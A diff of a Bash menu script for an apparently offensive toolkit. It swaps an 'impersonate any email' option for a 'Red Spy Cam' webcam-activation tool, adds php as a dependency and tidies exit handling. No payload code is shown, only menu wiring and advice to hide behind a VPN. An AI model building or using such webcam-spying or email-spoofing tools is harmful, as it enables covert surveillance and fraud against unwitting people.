@@ -48,6 +48,7 @@ trap ctrl_c INT
 
 function ctrl_c(){
 echo $(clear)
+kill_pid
 rm -rf tmp/* 2> /dev/null
 rm -rf logs/* 2> /dev/null
 rm -rf "$DISKDIGGERT" 2> /dev/null
@@ -119,7 +120,7 @@ echo $(clear);sleep 0.3
 echo -e "\n\e[1;32m$program_name (c) 2020-${UPDATED} by Z3R07-RED\e[0m"
 echo -e "\n\e[1;36m$program_name - version $version\e[0m"
 echo ""
-PKGS=(dialog git curl wget w3m sox nmap tor file zip) # dependencies
+PKGS=(dialog git curl wget w3m sox nmap tor file zip php) # dependencies
 for program in "${PKGS[@]}"; do
     if [ ! "$(command -v $program)" ]; then
         echo -e "\n${R}[X]${W}${C} $program${Y} is not installed.${W}";sleep 0.2
@@ -267,8 +268,8 @@ do
         --ok-label "Select" \
         --backtitle "$program_name - Red tools Z7" \
         --title "MENU" \
-        --menu "Powerful tools:" 13 45 5 \
-        "1" "[ Email-RedZ       ]" "Tool to impersonate any email." \
+        --menu "Powerful tools:" 12 60 5 \
+        "1" "[ Red Spy Cam      ]" "Activate webcam" \
         "2" "[ Extract links    ]" "Extract all links from a web page?" \
         "3" "[ Download website ]" "Do you want to download a website?" \
         "4" "[ Shorten URL      ]" "cut a url very fast." \
@@ -276,7 +277,11 @@ do
 
     case $red_toolsz_option in
         1)
-            source $email_redz_tool
+            if [[ -f "$RedSpyCam_tool" ]]; then
+                source "$RedSpyCam_tool"
+            else
+                file_not_found "$RedSpyCam_tool"
+            fi
             ;;
         2)
             extract_links
@@ -470,7 +475,7 @@ use a VPN every time you run this program.\n\
      255)
          echo $(clear); tput cnorm 2> /dev/null
          echo "Program aborted." >&2
-         echo "";exit 1
+         echo ""; exit 1
          ;;
 esac
 done
@@ -525,19 +530,18 @@ case $? in
                         else
                             echo $(clear)
                             echo -e "${R}Wrong answer.${W}"
-                            echo ""
-                            exit 1
+                            echo ""; exit 1
                         fi
                         ;;
                     1)
                         echo $(clear)
                         echo "Exiting ..."
-                        exit 0
+                        echo ""; exit 0
                         ;;
                     255)
                         echo $(clear)
                         echo "Program aborted." >&2
-                        exit 1
+                        echo ""; exit 1
                         ;;
                 esac
             else
